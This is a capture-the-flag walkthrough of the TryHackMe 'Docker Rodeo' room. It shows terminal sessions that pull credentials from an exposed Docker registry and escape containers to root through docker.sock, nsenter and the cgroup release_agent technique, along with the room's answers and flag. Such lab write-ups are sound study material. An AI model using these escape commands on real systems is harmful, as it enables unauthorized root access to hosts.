---
title: The Docker Rodeo
author: CYB3RM3
name: CYB3RM3 | The Docker Rodeo
date: 2022-04-23 17:01:19 +0100
categories: [TryHackMe, RedTeam]
tags: [Red Team, Docker]
---

Learn a wide variety of Docker vulnerabilities in this guided showcase.

THM Room [https://tryhackme.com/room/dockerrodeo](https://tryhackme.com/room/dockerrodeo)


## TASK 1 : Preface: Setting up Docker for this Room (Deploy #1)
### Let's go
Setting up the room :

```console
nano /etc/hosts
    10.10.119.94 docker-rodeo.thm

nano /etc/docker/daemon.json

    {
          "insecure-registries" : ["docker-rodeo.thm:5000","docker-rodeo.thm:7000"]
    }

systemctl stop docker
systemctl start docker
```
{: .nolineno }

No Answer

## TASK 2 : Introduction to Docker
### Does Docker run on a Hypervisor? (Yay/Nay) 

![Docker Structure](/images/thm/dockerrodeo/dockerrodeo_1.png)
_Docker Structure_

Answer : NAY

## TASK 3 : Vulnerability #1: Abusing a Docker Registry
### This task is a divider, please proceed onto the next task.
No Answer.

## TASK 4 : What is a Docker Registry?
### I've learnt about Docker registries 
No answer.

## TASK 5 : Interacting with a Docker Registry
### What is the port number of the 2nd Docker registry? 
Let's scan our target IP :

```console
root@ip-10-10-127-124:~# nmap -sV 10.10.119.94

Starting Nmap 7.60 ( https://nmap.org ) at 2022-04-23 10:52 BST
Nmap scan report for docker-rodeo.thm (10.10.119.94)
Host is up (0.00094s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Docker Registry (API: 2.0)
7000/tcp open  http    Docker Registry (API: 2.0)
MAC Address: 02:D6:10:EA:7B:3D (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.55 seconds
```
{: .nolineno }

Answer : 7000

### What is the name of the repository within this registry?

We need to do a GET request on the catalog : http://docker-rodeo.thm:7000/v2/_catalog

![GET Catalog](/images/thm/dockerrodeo/dockerrodeo_2.png)
_GET Catalog_

Answer : securesolutions/webserver

### What is the name of the tag that has been published?

We can now ask the tag list from this repository : GET http://docker-rodeo.thm:7000/v2/securesolutions/webserver/tags/list

![GET list](/images/thm/dockerrodeo/dockerrodeo_3.png)
_GET list_

Answer : production

### What is the Username in the database configuration?

Finally, GET our manifests file from production : GET http://docker-rodeo.thm:7000/v2/securesolutions/webserver/manifests/production

![GET production](/images/thm/dockerrodeo/dockerrodeo_4.png)
_GET production_

![GET production 2](/images/thm/dockerrodeo/dockerrodeo_5.png)
_GET production 2_

Answer : admin

### What is the Password in the database configuration?

Answer : production_admin

## TASK 6 : Vulnerability #2: Reverse Engineering Docker Images
### What is the "IMAGE_ID" for the "challenge" Docker image that you just downloaded? 

Let's pull our challenge docker the check the ID from this image :

```console

root@ip-10-10-127-124:~/docdoc# docker pull docker-rodeo.thm:5000/dive/challenge
Using default tag: latest
latest: Pulling from dive/challenge
171857c49d0f: Pull complete 
419640447d26: Pull complete 
61e52f862619: Pull complete 
eafe19b950d0: Pull complete 
039ca94db37a: Pull complete 
e28b2366e7c0: Pull complete 
11f4fb102c71: Pull complete 
Digest: sha256:154c868d6a74651a464ec131b43dec89bd4adf4760cdc83d32dbc8d401ee4a11
Status: Downloaded newer image for docker-rodeo.thm:5000/dive/challenge:latest
docker-rodeo.thm:5000/dive/challenge:latest
root@ip-10-10-127-124:~/docdoc# docker images
REPOSITORY                             TAG                 IMAGE ID            CREATED             SIZE
remnux/ciphey                          latest              ec11b47184f6        14 months ago       177MB
rustscan/rustscan                      2.0.0               6890f34e17b0        17 months ago       41.6MB
docker-rodeo.thm:5000/dive/challenge   latest              2a0a63ea5d88        18 months ago       111MB
docker-rodeo.thm:5000/dive/example     latest              398736241322        18 months ago       87.1MB
bcsecurity/empire                      v3.5.2              cbd0b10f7f55        18 months ago       2.05GB
mpepping/cyberchef                     latest              36979d2c2b9e        22 months ago       639MB
root@ip-10-10-127-124:~/docdoc# dive 2a0a63ea5d88
Image Source: docker://2a0a63ea5d88
Fetching image... (this can take a while for large images)
Analyzing image...
Building cache...
```
{: .nolineno }

Answer : 2a0a63ea5d88

### Using Dive, how many "Layers" are there in this image?

![Docker layers](/images/thm/dockerrodeo/dockerrodeo_6.png)
_Docker layers_

Answer : 7

### What user is successfully added?

![Docker user](/images/thm/dockerrodeo/dockerrodeo_7.png)
_Docker user_

Answer : uogctf

## TASK 7 : Vulnerability #3: Uploading Malicious Docker Images
### I've learnt that we can publish images with malicious code such as reverse shells to our vulnerable Docker registry.
No Answer.

## TASK 8 : Vulnerability #4: RCE via Exposed Docker Daemon
### I've executed some Docker commands remotely on the vulnerable Instance 
No Answer.

## TASK 9 : Vulnerability #5: Escape via Exposed Docker Daemon
### Escape Successful
Connect to ssh : 

```console
root@ip-10-10-127-124:~/docdoc# ssh danny@10.10.119.94 -p 2233
danny@10.10.119.94's password: 
Last login: Sat Apr 23 13:43:43 2022 from 10.10.127.124
danny@3d8fe1db6635:~$cd /var/run
danny@3d8fe1db6635:/var/run$ ^C
danny@3d8fe1db6635:/var/run$ ls -la | grep sock
srw-rw---- 1 root docker    0 Apr 23 09:21 docker.sock
danny@3d8fe1db6635:/var/run$ group
-bash: group: command not found
danny@3d8fe1db6635:/var/run$ groups
danny docker
danny@3d8fe1db6635:/var/run$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# whoami
root
```
{: .nolineno }

No Answer.

## TASK 10 : Vulnerability #6: Shared Namespaces
### What is the non-existent parent process for winlogon.exe? 
Using the exploit :

```console
root@63b932f4d7d2:~# ls
root@63b932f4d7d2:~# cd /home
root@63b932f4d7d2:/home# $l
root@63b932f4d7d2:/home# ls
danny
root@63b932f4d7d2:/home# nsenter --target 1 --mount sh
# id
uid=0(root) gid=0(root) groups=0(root)
# ls
bin   cdrom  etc   initrd.img	   lib	  lost+found  mnt  proc  run   snap  swap.img  tmp  var      vmlinuz.old
boot  dev    home  initrd.img.old  lib64  media       opt  root  sbin  srv   sys       usr  vmlinuz
# cd /home
# ls
cmnatic
# 
```
{: .nolineno }

No Answer.

## TASK 11 : Vulnerability #7: Misconfigured Privileges (Deploy #2)

### What is the non-existent process for explorer.exe? 

```console
root@ip-10-10-127-124:~/docdoc# ssh root@10.10.249.18 -p 2244
The authenticity of host '[10.10.249.18]:2244 ([10.10.249.18]:2244)' can't be established.
ECDSA key fingerprint is SHA256:g1op35eDDRf7ot7HFCNMORhlBt45tUzDKHrr7VqZAws.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[10.10.249.18]:2244' (ECDSA) to the list of known hosts.
root@10.10.249.18's password: 
root@8a9427527c82:~# capsh --print | grep sys_admin
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+eip
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
root@8a9427527c82:~# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@8a9427527c82:~# echo 1 > /tmp/cgrp/x/notify_on_release
root@8a9427527c82:~# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@8a9427527c82:~# echo "$host_path/exploit" > /tmp/cgrp/release_agent
root@8a9427527c82:~# echo '#!/bin/sh' > /exploit
root@8a9427527c82:~# echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
root@8a9427527c82:~# chmod a+x /exploit
root@8a9427527c82:~# ls
root@8a9427527c82:~#  sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@8a9427527c82:~# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@8a9427527c82:~# cd /
root@8a9427527c82:/# ls
bin  boot  dev  etc  exploit  flag.txt  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
root@8a9427527c82:/# cat flag.txt 
thm{you_escaped_the_chains}
root@8a9427527c82:/# cat exploit 
#!/bin/sh
cat /home/cmnatic/flag.txt > /var/lib/docker/overlay2/9b9172eea0e59d69f685b59ca0ef99c450876d5fe637b989c4c2d3502a49c769/diff/flag.txt
root@8a9427527c82:/#
```
{: .nolineno }

Answer : thm{you_escaped_the_chains}

## TASK 12 : Securing Your Container
###  I've secured my containers
No Answer

## TASK 13 : Bonus: Determining if we're in a container
### Confirming suspicions...

Checking if we're in docker container :

![Docker check](/images/thm/dockerrodeo/dockerrodeo_8.png)
_Docker check_

No Answer

## TASK 14 : Additional Material
### Finished!

No Answer